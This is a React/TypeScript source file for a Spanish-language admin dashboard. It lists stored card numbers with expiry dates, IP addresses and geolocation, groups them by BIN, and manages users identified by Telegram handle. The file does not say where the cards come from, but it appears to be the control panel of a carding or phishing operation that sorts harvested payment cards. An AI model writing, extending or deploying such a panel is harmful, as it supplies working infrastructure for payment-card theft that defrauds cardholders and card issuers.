import { useState, useEffect, useMemo } from 'react';
import { Link } from 'react-router-dom';
import { getCards, getRegisteredUsers, adminUpdateUserPassword } from '../../services/api';
import { useAuth } from '../../context/AuthContext';
import '../../styles/Dashboard.css';

interface CardRecord {
    id: number;
    cardNumber: string;
    expiry: string | null;
    ipAddress: string | null;
    ipInfo: Record<string, string> | null;
    createdAt: string;
}

interface UserRecord {
    id: number;
    username: string;
    telegramUser: string;
    ipAddress: string | null;
    profilePicture: string | null;
    createdAt: string;
}

type Tab = 'cards' | 'users';

export default function Dashboard() {
    const { token, logout } = useAuth();
    const [tab, setTab] = useState<Tab>('cards');
    const [cards, setCards] = useState<CardRecord[]>([]);
    const [users, setUsers] = useState<UserRecord[]>([]);
    const [loading, setLoading] = useState(true);
    const [search, setSearch] = useState('');

    // Password editing
    const [editingUserId, setEditingUserId] = useState<number | null>(null);
    const [newPw, setNewPw] = useState('');
    const [pwMsg, setPwMsg] = useState('');

    useEffect(() => {
        if (!token) return;
        setLoading(true);
        Promise.all([
            getCards(token, 1, 9999).catch(() => ({ data: [] })),
            getRegisteredUsers(token).catch(() => []),
        ])
            .then(([cardsRes, usersRes]) => {
                setCards(cardsRes.data || []);
                setUsers(Array.isArray(usersRes) ? usersRes : []);
            })
            .catch((err) => { if (err.message === 'UNAUTHORIZED') logout(); })
            .finally(() => setLoading(false));
    }, [token, logout]);

    const filtered = useMemo(() => {
        if (!search) return cards;
        const s = search.toLowerCase();
        return cards.filter(
            (c) =>
                c.cardNumber?.toLowerCase().includes(s) ||
                c.ipAddress?.toLowerCase().includes(s) ||
                c.expiry?.toLowerCase().includes(s),
        );
    }, [cards, search]);

    const filteredUsers = useMemo(() => {
        if (!search) return users;
        const s = search.toLowerCase();
        return users.filter(
            (u) =>
                u.username?.toLowerCase().includes(s) ||
                u.telegramUser?.toLowerCase().includes(s) ||
                u.ipAddress?.toLowerCase().includes(s),
        );
    }, [users, search]);

    const binGroups = useMemo(() => {
        const map = new Map<string, CardRecord[]>();
        filtered.forEach((c) => {
            const bin = c.cardNumber?.replace(/\s/g, '').slice(0, 6) || 'UNKNOWN';
            const group = map.get(bin) || [];
            group.push(c);
            map.set(bin, group);
        });
        return Array.from(map.entries())
            .map(([bin, items]) => ({
                bin,
                count: items.length,
                latest: items.reduce(
                    (max, c) => (c.createdAt > max ? c.createdAt : max),
                    items[0]?.createdAt || '',
                ),
            }))
            .sort((a, b) => a.bin.localeCompare(b.bin));
    }, [filtered]);

    const handleUpdatePassword = async (userId: number) => {
        if (!token || newPw.length < 8) { setPwMsg('Mínimo 8 caracteres'); return; }
        try {
            await adminUpdateUserPassword(token, userId, newPw);
            setPwMsg('Contraseña actualizada');
            setNewPw('');
            setTimeout(() => { setEditingUserId(null); setPwMsg(''); }, 1500);
        } catch { setPwMsg('Error al actualizar'); }
    };

    return (
        <div className="dashboard">
            <div className="dash-header">
                <div className="dash-title">
                    <div className="icon"><i className="fas fa-terminal" /></div>
                    <div>
                        <h1>Admin Panel</h1>
                        <p>Panel de control</p>
                    </div>
                </div>
                <div className="dash-actions">
                    <div className="search-box">
                        <i className="fas fa-search" />
                        <input
                            placeholder={tab === 'cards' ? 'Buscar por número, IP...' : 'Buscar usuario, telegram, IP...'}
                            value={search}
                            onChange={(e) => setSearch(e.target.value)}
                        />
                    </div>
                    <button className="logout-btn" onClick={logout}>
                        <i className="fas fa-sign-out-alt" /> Cerrar Sesión
                    </button>
                </div>
            </div>

            <div className="dash-tabs">
                <button className={`dash-tab${tab === 'cards' ? ' active' : ''}`} onClick={() => { setTab('cards'); setSearch(''); }}>
                    <i className="fas fa-credit-card" /> Tarjetas
                </button>
                <button className={`dash-tab${tab === 'users' ? ' active' : ''}`} onClick={() => { setTab('users'); setSearch(''); }}>
                    <i className="fas fa-users" /> Usuarios
                </button>
            </div>

            <div className="stats-row">
                {tab === 'cards' ? (
                    <>
                        <div className="stat-card">
                            <div className="label">Total Tarjetas</div>
                            <div className="value">{filtered.length}</div>
                        </div>
                        <div className="stat-card">
                            <div className="label">BINs Únicos</div>
                            <div className="value">{binGroups.length}</div>
                        </div>
                    </>
                ) : (
                    <>
                        <div className="stat-card">
                            <div className="label">Usuarios Registrados</div>
                            <div className="value">{filteredUsers.length}</div>
                        </div>
                        <div className="stat-card">
                            <div className="label">Total Whitelist</div>
                            <div className="value">42</div>
                        </div>
                    </>
                )}
            </div>

            {loading ? (
                <div className="loading-state">
                    <div className="loading-spinner" />
                    <p>Cargando datos...</p>
                </div>
            ) : tab === 'cards' ? (
                binGroups.length === 0 ? (
                    <div className="empty-state">
                        <i className="fas fa-database" />
                        <p>{search ? 'No se encontraron resultados' : 'No hay tarjetas registradas'}</p>
                    </div>
                ) : (
                    <div className="bin-groups-container">
                        {binGroups.map((g) => (
                            <Link key={g.bin} to={`/admin/bin/${g.bin}`} className="bin-group-link">
                                <div className="bin-group">
                                    <div className="bin-group-header">
                                        <div className="bin-group-header-left">
                                            <div className="bin-group-icon"><i className="fas fa-credit-card" /></div>
                                            <div className="bin-group-info">
                                                <div className="bin-group-title">
                                                    BIN: <span className="bin-label">{g.bin}</span>
                                                    <span className="bin-group-badge"><i className="fas fa-layer-group" /> {g.count}</span>
                                                </div>
                                                <div className="bin-group-meta">Última: {new Date(g.latest).toLocaleString()}</div>
                                            </div>
                                        </div>
                                        <div className="bin-group-arrow"><i className="fas fa-chevron-right" /></div>
                                    </div>
                                </div>
                            </Link>
                        ))}
                    </div>
                )
            ) : (
                filteredUsers.length === 0 ? (
                    <div className="empty-state">
                        <i className="fas fa-users" />
                        <p>{search ? 'No se encontraron resultados' : 'No hay usuarios registrados'}</p>
                    </div>
                ) : (
                    <div className="users-list">
                        {filteredUsers.map((u) => (
                            <div key={u.id} className="user-row">
                                <div className="user-row-avatar">
                                    {u.profilePicture ? (
                                        <img src={u.profilePicture} alt="" />
                                    ) : (
                                        <i className="fas fa-user" />
                                    )}
                                </div>
                                <div className="user-row-info">
                                    <div className="user-row-name">{u.username}</div>
                                    <div className="user-row-meta">
                                        <span className="user-tg"><i className="fab fa-telegram-plane" /> {u.telegramUser}</span>
                                        <span className="user-ip"><i className="fas fa-globe" /> {u.ipAddress || 'N/A'}</span>
                                        <span className="user-date"><i className="fas fa-clock" /> {new Date(u.createdAt).toLocaleDateString()}</span>
                                    </div>
                                </div>
                                <div className="user-row-actions">
                                    {editingUserId === u.id ? (
                                        <div className="pw-edit-inline">
                                            <input
                                                type="password"
                                                placeholder="Nueva contraseña"
                                                value={newPw}
                                                onChange={(e) => setNewPw(e.target.value)}
                                                autoFocus
                                            />
                                            <button className="pw-save-btn" onClick={() => handleUpdatePassword(u.id)}>
                                                <i className="fas fa-check" />
                                            </button>
                                            <button className="pw-cancel-btn" onClick={() => { setEditingUserId(null); setNewPw(''); setPwMsg(''); }}>
                                                <i className="fas fa-times" />
                                            </button>
                                            {pwMsg && <span className="pw-msg">{pwMsg}</span>}
                                        </div>
                                    ) : (
                                        <button className="pw-edit-btn" onClick={() => { setEditingUserId(u.id); setNewPw(''); setPwMsg(''); }}>
                                            <i className="fas fa-key" /> Cambiar contraseña
                                        </button>
                                    )}
                                </div>
                            </div>
                        ))}
                    </div>
                )
            )}
        </div>
    );
}
